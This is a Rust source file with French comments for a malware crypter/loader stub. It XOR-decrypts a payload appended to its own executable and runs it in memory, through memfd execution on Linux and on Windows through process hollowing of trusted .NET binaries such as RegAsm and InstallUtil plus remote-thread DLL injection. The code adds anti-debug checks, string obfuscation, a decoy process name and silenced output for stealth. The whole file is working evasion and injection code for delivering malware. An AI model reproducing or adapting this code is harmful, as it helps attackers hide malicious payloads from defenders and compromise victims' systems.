// #![windows_subsystem = "windows"] // Décommenter pour la release (Mode GUI)
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::env;
use std::fs::File;
use std::io::Read;
use std::process::exit;
use std::ptr;
use obfstr::obfstr;

mod security;

const MAGIC_DELIMITER: &[u8] = &[0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xFF, 0xEE, 0x11];
const PARTIAL_KEY: u8 = 0x55;


fn main() {
    // 1️⃣ Anti-Debug
    let corrupted_mode = security::run_all_checks();

    let current_exe = env::current_exe().unwrap_or_else(|_| std::process::exit(0));

    let mut file = File::open(current_exe).unwrap_or_else(|_| std::process::exit(0));

    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).unwrap_or_else(|_| std::process::exit(0));

    let delimiter_pos =
        buffer.windows(MAGIC_DELIMITER.len())
              .rposition(|w| w == MAGIC_DELIMITER);

    if let Some(pos) = delimiter_pos {

        let encrypted_data = &buffer[pos + MAGIC_DELIMITER.len()..];

        let final_key = if corrupted_mode {
            PARTIAL_KEY ^ 0xFF
        } else {
            PARTIAL_KEY
        };

        let decrypted: Vec<u8> =
            encrypted_data.iter().map(|&b| b ^ final_key).collect();

        #[cfg(target_os = "linux")]
        linux_mem_exec(decrypted);

        #[cfg(target_os = "windows")]
        unsafe { run_pe(decrypted); }

    } else {
        println!("{}", obfstr!("[-] Payload introuvable !"));
        let mut s = String::new();
        std::io::stdin().read_line(&mut s).unwrap();
    }
}

// Wrapper Helper
unsafe fn get_time_cycles() -> u64 {
    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    { std::arch::x86_64::_rdtsc() }
    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    { 0 }
}

fn is_being_debugged() -> bool {
    #[cfg(target_os = "linux")]
    unsafe { if libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0) < 0 { return true; } }
    #[cfg(target_os = "windows")]
    unsafe { if winapi::um::debugapi::IsDebuggerPresent() != 0 { return true; } }
    false
}

// =============================================================
// LINUX: MEMFD EXECUTION
// =============================================================
#[cfg(target_os = "linux")]
fn linux_mem_exec(payload: Vec<u8>) {
    use std::os::unix::io::FromRawFd;
    use std::ffi::CString;
    use std::io::Write;
    use std::process::Command;
    unsafe {
        // Nom du process furtif
        let name = CString::new(obfstr!("initrd")).unwrap();
        let fd = libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC);
        if fd < 0 { return; }
        
        let mut file = File::from_raw_fd(fd);
        file.write_all(&payload).unwrap();
        
        let path = format!("{}/{}", obfstr!("/proc/self/fd"), fd);
        let args: Vec<String> = env::args().skip(1).collect();
        
        Command::new(path).args(&args).status().ok();
    }
}

// =============================================================
// WINDOWS: INJECTION DLL
// =============================================================
#[cfg(target_os = "windows")]
unsafe fn inject_remote_dll(h_process: winapi::um::winnt::HANDLE, dll_name: &str) {
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
    use winapi::um::processthreadsapi::CreateRemoteThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE};
    use std::ffi::CString;

    // .to_string() est important ici aussi si on stockait dans une variable, 
    // mais ici on passe directement à CString::new donc ça va.
    let k32 = CString::new(obfstr!("kernel32.dll")).unwrap();
    let loadlib = CString::new(obfstr!("LoadLibraryA")).unwrap();
    
    let h_kernel32 = GetModuleHandleA(k32.as_ptr());
    let load_lib_addr = GetProcAddress(h_kernel32, loadlib.as_ptr());

    if load_lib_addr.is_null() { return; }

    let c_dll_name = CString::new(dll_name).unwrap();
    let dll_name_size = c_dll_name.as_bytes_with_nul().len();

    let remote_mem = VirtualAllocEx(h_process, ptr::null_mut(), dll_name_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if remote_mem.is_null() { return; }

    let mut written = 0;
    WriteProcessMemory(h_process, remote_mem, c_dll_name.as_ptr() as *const _, dll_name_size, &mut written);

    let h_thread = CreateRemoteThread(
        h_process, ptr::null_mut(), 0, Some(std::mem::transmute(load_lib_addr)), remote_mem, 0, ptr::null_mut()
    );

    if !h_thread.is_null() {
        // println!("    {} {}", obfstr!("[+] Injection dependance:"), dll_name); // Commenté pour discrétion
        WaitForSingleObject(h_thread, 1000); 
        winapi::um::handleapi::CloseHandle(h_thread);
    }
    VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
}

// Helper pour résoudre les adresses mémoire
#[cfg(target_os = "windows")]
unsafe fn resolve_rva(
    nt_headers: *const winapi::um::winnt::IMAGE_NT_HEADERS64, 
    section_header_ptr: *const winapi::um::winnt::IMAGE_SECTION_HEADER, 
    rva: u32
) -> usize {
    use winapi::um::winnt::IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections;
    
    for i in 0..num_sections {
        let section = &*section_header_ptr.offset(i as isize);
        if rva >= section.VirtualAddress && rva < section.VirtualAddress + section.SizeOfRawData {
            return (rva - section.VirtualAddress + section.PointerToRawData) as usize;
        }
    }
    return rva as usize;
}

// =============================================================
// WINDOWS: RUNPE / PROCESS HOLLOWING
// =============================================================
#[cfg(target_os = "windows")]
unsafe fn run_pe(payload: Vec<u8>) {
    use winapi::um::processthreadsapi::{CreateProcessA, GetThreadContext, SetThreadContext, ResumeThread, TerminateProcess};
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, ReadProcessMemory};
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, CONTEXT_FULL, 
        IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
        IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
        IMAGE_BASE_RELOCATION, IMAGE_IMPORT_DESCRIPTOR, IMAGE_THUNK_DATA64, 
        IMAGE_REL_BASED_DIR64
    };
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    use std::ffi::CString;

    // --- CORRECTION CRITIQUE ICI ---
    // On utilise .to_string() pour copier la chaîne temporaire d'obfstr dans une String persistante (Heap).
    // Cela empêche l'erreur "temporary value dropped while borrowed".
    let s1 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe").to_string();
    let s2 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe").to_string();
    let s3 = obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe").to_string();
    let s4 = obfstr!("C:\\Windows\\System32\\cmd.exe").to_string();

    // Maintenant on peut faire un tableau de références vers ces Strings valides
    let candidates = [&s1, &s2, &s3, &s4];

    let mut si = std::mem::zeroed();
    let mut pi = std::mem::zeroed();
    let mut success = 0;
    let mut chosen_host = "";

    for host in candidates.iter() {
        if std::path::Path::new(host).exists() {
            // Conversion String -> CString pour l'API Windows
            let app_name = CString::new(host.as_str()).unwrap();
            
            success = CreateProcessA(
                app_name.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi
            );
            if success != 0 {
                chosen_host = host;
                break; 
            }
        }
    }

    if success == 0 {
        // println!("{}", obfstr!("[-] Erreur hôte."));
        return;
    }
    // println!("{} {}", obfstr!("[*] Hote:"), chosen_host);

    // Parsing PE
    let dos_header = &*(payload.as_ptr() as *const IMAGE_DOS_HEADER);
    let nt_headers = &*(payload.as_ptr().offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64);
    
    if dos_header.e_magic != 0x5A4D || nt_headers.Signature != 0x4550 {
        TerminateProcess(pi.hProcess, 1);
        return; 
    }

    let img_base = nt_headers.OptionalHeader.ImageBase;
    let img_size = nt_headers.OptionalHeader.SizeOfImage as usize;

    // Allocation
    let mut dest_addr = VirtualAllocEx(pi.hProcess, img_base as *mut _, img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    let mut delta_reloc: isize = 0;

    if dest_addr.is_null() {
        dest_addr = VirtualAllocEx(pi.hProcess, ptr::null_mut(), img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if dest_addr.is_null() { TerminateProcess(pi.hProcess, 1); return; }
        delta_reloc = (dest_addr as isize).wrapping_sub(img_base as isize);
    }

    // Copie Headers
    let mut bytes_written = 0;
    WriteProcessMemory(pi.hProcess, dest_addr, payload.as_ptr() as *const _, nt_headers.OptionalHeader.SizeOfHeaders as usize, &mut bytes_written);

    // Copie Sections
    let section_header_ptr = (payload.as_ptr().offset(dos_header.e_lfanew as isize) as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section = &*section_header_ptr.offset(i as isize);
        if section.SizeOfRawData > 0 {
            let dest = (dest_addr as usize + section.VirtualAddress as usize) as *mut _;
            let src = payload.as_ptr().offset(section.PointerToRawData as isize) as *const _;
            WriteProcessMemory(pi.hProcess, dest, src, section.SizeOfRawData as usize, &mut bytes_written);
        }
    }

    // Relocations
    if delta_reloc != 0 {
        let reloc_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.Size > 0 {
            let mut reloc_offset = resolve_rva(nt_headers, section_header_ptr, reloc_dir.VirtualAddress);
            let mut reloc_block = (payload.as_ptr() as usize + reloc_offset) as *const IMAGE_BASE_RELOCATION;
            while (*reloc_block).SizeOfBlock > 0 {
                let count = ((*reloc_block).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let reloc_data = (reloc_block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
                for i in 0..count {
                    let entry = *reloc_data.offset(i as isize);
                    if (entry >> 12) == IMAGE_REL_BASED_DIR64 { 
                        let target_rva = (*reloc_block).VirtualAddress as usize + (entry & 0x0FFF) as usize;
                        let patch_addr = (dest_addr as usize + target_rva) as *mut u64;
                        let mut val: u64 = 0;
                        ReadProcessMemory(pi.hProcess, patch_addr as *const _, &mut val as *mut _ as *mut _, 8, ptr::null_mut());
                        let patched = (val as isize + delta_reloc) as u64;
                        WriteProcessMemory(pi.hProcess, patch_addr as *mut _, &patched as *const _ as *const _, 8, ptr::null_mut());
                    }
                }
                reloc_offset += (*reloc_block).SizeOfBlock as usize;
                reloc_block = (payload.as_ptr() as usize + reloc_offset) as *const IMAGE_BASE_RELOCATION;
            }
        }
    }

    // Imports & Injection
    let import_dir = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.Size > 0 {
        let mut import_desc_offset = resolve_rva(nt_headers, section_header_ptr, import_dir.VirtualAddress);
        let mut import_desc = (payload.as_ptr() as usize + import_desc_offset) as *const IMAGE_IMPORT_DESCRIPTOR;

        while (*import_desc).Name != 0 {
            let dll_name_offset = resolve_rva(nt_headers, section_header_ptr, (*import_desc).Name);
            let dll_name_ptr = (payload.as_ptr() as usize + dll_name_offset) as *const i8;
            let c_dll_name = std::ffi::CStr::from_ptr(dll_name_ptr);
            let dll_str = c_dll_name.to_string_lossy();

            // Injection des DLL (fix crash)
            if !dll_str.to_lowercase().contains(obfstr!("kernel32.dll")) && !dll_str.to_lowercase().contains(obfstr!("ntdll.dll")) {
                inject_remote_dll(pi.hProcess, &dll_str);
            }

            let h_dll = LoadLibraryA(dll_name_ptr);
            if !h_dll.is_null() {
                let mut thunk_rva = (*import_desc).FirstThunk;
                let mut original_thunk_rva = *(*import_desc).u.OriginalFirstThunk();
                if original_thunk_rva == 0 { original_thunk_rva = thunk_rva; }

                let mut thunk_ptr = (payload.as_ptr() as usize + resolve_rva(nt_headers, section_header_ptr, original_thunk_rva)) as *const IMAGE_THUNK_DATA64;
                let mut dest_thunk_addr = (dest_addr as usize + thunk_rva as usize) as *mut u64;

                while *(*thunk_ptr).u1.AddressOfData() != 0 {
                    let func_addr;
                    if (*(*thunk_ptr).u1.Ordinal() & 0x8000000000000000) != 0 {
                        let ordinal = (*(*thunk_ptr).u1.Ordinal() & 0xFFFF) as u64;
                        func_addr = GetProcAddress(h_dll, ordinal as *const i8);
                    } else {
                        let name_offset = resolve_rva(nt_headers, section_header_ptr, *(*thunk_ptr).u1.AddressOfData() as u32);
                        let name_ptr = (payload.as_ptr() as usize + name_offset + 2) as *const i8; 
                        func_addr = GetProcAddress(h_dll, name_ptr);
                    }
                    if !func_addr.is_null() {
                        WriteProcessMemory(pi.hProcess, dest_thunk_addr as *mut _, &func_addr as *const _ as *const _, 8, ptr::null_mut());
                    }
                    thunk_ptr = thunk_ptr.offset(1);
                    dest_thunk_addr = dest_thunk_addr.offset(1);
                }
            }
            import_desc = import_desc.offset(1);
        }
    }

    // Hijack
    let mut ctx = std::mem::zeroed::<winapi::um::winnt::CONTEXT>();
    ctx.ContextFlags = CONTEXT_FULL;
    
    if GetThreadContext(pi.hThread, &mut ctx) != 0 {
        let entry_point = (dest_addr as u64) + nt_headers.OptionalHeader.AddressOfEntryPoint as u64;
        ctx.Rip = entry_point;
        ctx.Rcx = dest_addr as u64; 
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        //println!("{}", obfstr!("[+] Injection REUSSIE !"));
    }
}
